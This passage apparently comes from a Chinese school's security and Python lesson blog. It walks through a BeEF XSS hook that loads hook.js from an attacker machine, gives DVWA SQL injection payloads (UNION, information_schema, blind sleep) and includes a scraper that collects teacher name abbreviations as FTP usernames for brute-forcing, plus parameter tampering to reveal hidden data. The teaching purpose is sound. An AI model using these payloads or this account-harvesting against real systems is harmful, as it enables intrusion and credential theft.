class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">auto eth0iface eth0 inet static  # 配置eth0使用静态地址address 10.163.72.194   # 配置固定IP地址netmask 255.255.255.0   # 配置子网掩码gateway 10.163.72.20    # 配置网关<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><em>提示：配置IP地址之前ping一下，如果提示无法访问目标主机，说明应该没人用。</em></li><li>重启网络<pre class="line-numbers language-none"><code class="language-none">systemctl restart networking<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>关闭networkManager<br>如果没有生效，可能networkManager影响了，networkManager是网络服务的图形管理工具，它会默认接管网络服务。<pre class="line-numbers language-none"><code class="language-none">systemctl stop NetworkManager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>配置DNS<pre class="line-numbers language-none"><code class="language-none">vim /etc/resolv.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看IP是否修改完成<pre class="line-numbers language-none"><code class="language-none">ifconfigifconfig eth0 192.168.1.1 # 配置临时IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><em>如果嫌麻烦，可以配置临时ip，不过重启网络服务就没了</em></li></ol><h2 id="四、自动化XSS工具beef"><a href="#四、自动化XSS工具beef" class="headerlink" title="四、自动化XSS工具beef"></a>四、自动化XSS工具beef</h2><ol><li>启动beef<br>第一次启动可能要设置密码，设置密码之后，beef就启动好了<br>beef会提供一个访问地址，127.0.0.1:3000/ui/panel，注意这个地址是本地环回地址，如果想在真机访问，需要把ip换成虚机的ip<br><em>如果设置的密码忘了，可以输入cat /etc/beef-xss/config.yaml查看密码</em></li><li>布置钩子<br>接下来就可以重复之前的套路，把beef自动生成的勾子文件弄到靶机上<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.148.129:3000/hook.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><em>在此之前，记得清空一下dvwa的数据库</em></li><li>收获牛肉<br>打开beef，发现已经有人中招了，现在就可以随便玩了，beef提供了非常多好玩的功能，比如页面弹框，强制跳转，修改页面链接，播放音频，启动摄像头，浏览器窗口拍照，钓鱼等等。太多了，篇幅有限，不详细讲了，请自行摸索吧<h2 id="五、特别声明"><a href="#五、特别声明" class="headerlink" title="五、特别声明"></a>五、特别声明</h2>本网站特意设计了xss跨站攻击漏洞，应该很容易就能找到，因为这种漏洞不会危害服务器，所以大家随便玩吧（一般是危害用户，比如盗别人的账号，利用钓鱼网站骗别人的钱等等）。<br>特别声明一点，本网站是用于海盐商贸学校计算机专业实战演练的漏洞靶机网站，只能用于学习网络安全相关知识，磨练技能，请记得我们是白帽子阵营，请勿违反<strong>《中华人民共和国网络安全法》</strong>，从事违法犯罪，否则后果自负</li></ol><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一、测试是否有注入点"><a href="#一、测试是否有注入点" class="headerlink" title="一、测试是否有注入点"></a>一、测试是否有注入点</h2><p>先输入一个<code>'</code>(英文单引号)，如果报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1，就证明能够接受单引号，存在SQL注入点。</p><h2 id="二、获得注入点当前数据表全部内容"><a href="#二、获得注入点当前数据表全部内容" class="headerlink" title="二、获得注入点当前数据表全部内容"></a>二、获得注入点当前数据表全部内容</h2><p>原始语句：<code>select first_name,last_name from dvwa.users where user_id=''</code></p><p>SQL注入语句：<code>' or 1=1 --'</code></p><p>注入后语句：<code>mysql -udvwa -pdvwa dvwa -e "select first_name,last_name from dvwa.users where user_id=' ' or 1=1 -- ' '"</code></p><h2 id="三、UNION联合查询"><a href="#三、UNION联合查询" class="headerlink" title="三、UNION联合查询"></a>三、UNION联合查询</h2><p>SQL注入语句：<code> 'union select user(), database() -- '</code></p><p>注入后语句： <code>select first_name,last_name from dvwa.users where user_id=''union select user(),database() -- ''</code></p><p><code>version() </code>获得数据库版本信息<br><code>database() </code>获得当前数据库名<br><code>user()</code> 获得当前用户名<br><em>注意：<code>union</code>后的字段必须和前面的一样，可以一个一个的猜。</em></p><h2 id="四、查询所有的库名及表名"><a href="#四、查询所有的库名及表名" class="headerlink" title="四、查询所有的库名及表名"></a>四、查询所有的库名及表名</h2><p><code>'union select TABLE_SCHEMA, table_name from INFORMATION_SCHEMA.tables -- '</code></p><h2 id="五、获得任意表任意字段数据"><a href="#五、获得任意表任意字段数据" class="headerlink" title="五、获得任意表任意字段数据"></a>五、获得任意表任意字段数据</h2><p><code>'union select 字段1, 字段2 from 数据表 -- '</code></p><p>因为<code>union</code>必须和前面的字段保持一致，如果想多查询几个字段，可以使用<code>concat</code>的方式如下，中间的空格用于将各个字段分隔开。</p><p><code>'union select 字段1, concat(字段2,' ',字段3,' ',字段4) from users -- '</code></p><h2 id="六、盲注点"><a href="#六、盲注点" class="headerlink" title="六、盲注点"></a>六、盲注点</h2><p>有些注入点是只接受用户输入，但是不显示出来，dvwa就提供了一个盲注点。</p><p>SQL注入语句：<code> ' and sleep(5) --</code></p><p>注入后语句：<code> select first_name,last_name from dvwa.users where user_id='1' and sleep(5) --</code></p><p>如果网页显示加载图标就证明这个是一个注入点。</p><video id="video" controls="" src="http://10.163.72.39:7777/123.mp4" preload="none"></video>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫基础</title>
      <link href="/2022/10/29/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/10/29/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h6 id="声明：网站根目录下的robots-txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。"><a href="#声明：网站根目录下的robots-txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。" class="headerlink" title="声明：网站根目录下的robots.txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。"></a>声明：网站根目录下的robots.txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。</h6><h2 id="一、三国演义下载（request）"><a href="#一、三国演义下载（request）" class="headerlink" title="一、三国演义下载（request）"></a>一、三国演义下载（request）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url <span class="token operator">=</span> <span class="token string">"http://10.163.72.55:7777/image/sanguo1.md"</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span> <span class="token comment">#打印对象的响应状态码，以检查请求是否成功</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token comment">#把对象的文本以字符串的形式返回</span><span class="token comment"># 创建一个名为三国演义的txt文档，以写模式打开</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"三国演义.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token comment"># 写进文件中，相当于——  蔡徐坤.吃饭("包子")</span><span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># 关闭文档，相当于——    蔡徐坤.睡觉()  </span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="练习：获取http-10-163-72-55-7777-image-HTTP-md"><a href="#练习：获取http-10-163-72-55-7777-image-HTTP-md" class="headerlink" title="练习：获取http://10.163.72.55:7777/image/HTTP.md"></a>练习：获取<a href="http://10.163.72.55:7777/image/HTTP.md">http://10.163.72.55:7777/image/HTTP.md</a></h6><h6 id="扩展任务：批量爬取三国演义前三章"><a href="#扩展任务：批量爬取三国演义前三章" class="headerlink" title="扩展任务：批量爬取三国演义前三章"></a>扩展任务：批量爬取三国演义前三章</h6><h2 id="二、爬取一张图片（request）"><a href="#二、爬取一张图片（request）" class="headerlink" title="二、爬取一张图片（request）"></a>二、爬取一张图片（request）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/img/angry.55b2c9de.gif'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token comment">#打印对象的响应状态码，以检查请求是否成功</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token comment">#打印对象的二进制编码内容</span><span class="token comment"># 新建了一个文件angry.jpg，这里的文件没加路径，它会被保存在程序运行的当前目录下。</span><span class="token comment"># 图片内容需要以二进制wb读写。</span>photo <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'angry.jpg'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token comment"># 获取pic的二进制内容</span>photo<span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token comment"># 关闭文件</span>photo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="练习：我网站的所有图片，自己爬着玩吧"><a href="#练习：我网站的所有图片，自己爬着玩吧" class="headerlink" title="练习：我网站的所有图片，自己爬着玩吧"></a>练习：我网站的所有图片，自己爬着玩吧</h6><h2 id="三、爬取一段视频（request）"><a href="#三、爬取一段视频（request）" class="headerlink" title="三、爬取一段视频（request）"></a>三、爬取一段视频（request）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/media/banner3.043818a0.mp4'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token comment">#打印对象的响应状态码，以检查请求是否成功</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token comment">#打印对象的二进制编码内容</span><span class="token comment"># 新建了一个文件banner.mp4，这里的文件没加路径，它会被保存在程序运行的当前目录下。</span><span class="token comment"># 图片内容需要以二进制wb读写。</span>video <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'banner.mp4'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token comment"># 获取pic的二进制内容</span>video<span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token comment"># 关闭文件</span>video<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、豆瓣电影top250爬虫（静态网页bs4）"><a href="#四、豆瓣电影top250爬虫（静态网页bs4）" class="headerlink" title="四、豆瓣电影top250爬虫（静态网页bs4）"></a>四、豆瓣电影top250爬虫（静态网页bs4）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>openpyxl<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupwb<span class="token operator">=</span>openpyxl<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>wb<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">'豆瓣'</span>sheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'电影名'</span>sheet<span class="token punctuation">[</span><span class="token string">'B1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'评分'</span>sheet<span class="token punctuation">[</span><span class="token string">'C1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'推荐语'</span>sheet<span class="token punctuation">[</span><span class="token string">'D1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'链接'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'http://10.163.72.55/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%20Top%20250.html?start='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&amp;filter='</span>    <span class="token comment"># url='https://movie.douban.com/top250?start='+str(i)+'&amp;filter='</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">}</span>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>    movies<span class="token operator">=</span>soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"info"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> movie <span class="token keyword">in</span> movies<span class="token punctuation">:</span>        href<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>        name<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        star<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"rating_num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        quote<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"quote"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>name<span class="token punctuation">,</span>star<span class="token punctuation">,</span>quote<span class="token punctuation">,</span>href<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>href<span class="token operator">+</span>name<span class="token operator">+</span>star<span class="token operator">+</span>quote<span class="token punctuation">)</span>wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'.\豆瓣爬虫的数据.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、机房管理系统爬虫（静态网页bs4）"><a href="#五、机房管理系统爬虫（静态网页bs4）" class="headerlink" title="五、机房管理系统爬虫（静态网页bs4）"></a>五、机房管理系统爬虫（静态网页bs4）</h2><p>爬取教师姓名的缩写，你们懂的，这个姓名缩写同时也是ftp的账号，可以用来爆破ftp的密码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>re<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSouptxt<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./teacher_name.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">'http://10.163.72.11/index/admin/teacher'</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">}</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>items <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'h5'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'card-title'</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>    name <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'【.*】'</span><span class="token punctuation">,</span>item<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment">#去掉前面的括号</span>    name <span class="token operator">=</span> name<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#去掉前面的括号</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'down'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>txt<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、爬取神秘暗网留言板（动态网站json）"><a href="#六、爬取神秘暗网留言板（动态网站json）" class="headerlink" title="六、爬取神秘暗网留言板（动态网站json）"></a>六、爬取神秘暗网留言板（动态网站json）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>openpyxlwb <span class="token operator">=</span> openpyxl<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'留言数据'</span>sheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'用户ID'</span>sheet<span class="token punctuation">[</span><span class="token string">'B1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'用户名'</span>sheet<span class="token punctuation">[</span><span class="token string">'C1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'积分'</span>sheet<span class="token punctuation">[</span><span class="token string">'D1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'留言内容'</span><span class="token comment"># 爬取前十页</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/messageData.php?currentPage='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    res_jons <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 解析为json格式数据</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>res_jons<span class="token punctuation">)</span><span class="token punctuation">)</span>    massage_list <span class="token operator">=</span> res_jons<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> massage_list<span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        username <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        rankScore <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'rankScore'</span><span class="token punctuation">]</span>        message <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>        sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>rankScore<span class="token punctuation">,</span>message<span class="token punctuation">]</span><span class="token punctuation">)</span>wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'.\神秘暗网留言板爬虫.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、带着参数请求数据（偷看隐藏数据）"><a href="#七、带着参数请求数据（偷看隐藏数据）" class="headerlink" title="七、带着参数请求数据（偷看隐藏数据）"></a>七、带着参数请求数据（偷看隐藏数据）</h2><p>假设神秘暗网首页作业栏目，不可以点击查看更多，可以携带参数查看隐藏信息。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/taskListData.php'</span>params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'task_num'</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>task_list <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token keyword">for</span> task <span class="token keyword">in</span> task_list<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'作业标题为：'</span><span class="token punctuation">,</span>task<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设用户管理中，教师组属于敏感信息，不让普通用户查询，你知道该怎么做了吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/userAdminDataClass.php'</span>params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'className'</span><span class="token punctuation">:</span><span class="token string">'22计2'</span><span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>user_list <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token keyword">for</span> user <span class="token keyword">in</span> user_list<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户姓名为：'</span><span class="token punctuation">,</span>user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="八、指挥浏览器登录神秘暗网（自动脚本）"><a href="#八、指挥浏览器登录神秘暗网（自动脚本）" class="headerlink" title="八、指挥浏览器登录神秘暗网（自动脚本）"></a>八、指挥浏览器登录神秘暗网（自动脚本）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span>  webdriver <span class="token comment"># 从selenium库中调用webdriver模块</span><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">import</span> timedriver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">'chromedriver.exe'</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://10.163.72.55/#/index/IndexTask'</span><span class="token punctuation">)</span> <span class="token comment"># 访问页面</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 暂停两秒，等待浏览器缓冲</span>login <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span><span class="token string">'login'</span><span class="token punctuation">)</span>login<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 点击【提交】按钮</span>username <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token comment"># 找到用户名输入框位置</span>username<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'你的名字'</span><span class="token punctuation">)</span> <span class="token comment"># 输入文字</span>password <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">)</span> <span class="token comment"># 找到密码输入框位置</span>password<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token number">123456</span><span class="token punctuation">)</span>login_button <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>CLASS_NAME<span class="token punctuation">,</span><span class="token string">'login_button'</span><span class="token punctuation">)</span> <span class="token comment"># 找到密码输入框位置</span>login_button<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="九、通过cookie留言（突破留言板限制）"><a href="#九、通过cookie留言（突破留言板限制）" class="headerlink" title="九、通过cookie留言（突破留言板限制）"></a>九、通过cookie留言（突破留言板限制）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment">#获得cookies</span>url<span class="token operator">=</span><span class="token string">'http://10.163.72.55/LoginPost.php'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span><span class="token punctuation">}</span>data<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'username'</span><span class="token punctuation">,</span>    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'password'</span><span class="token 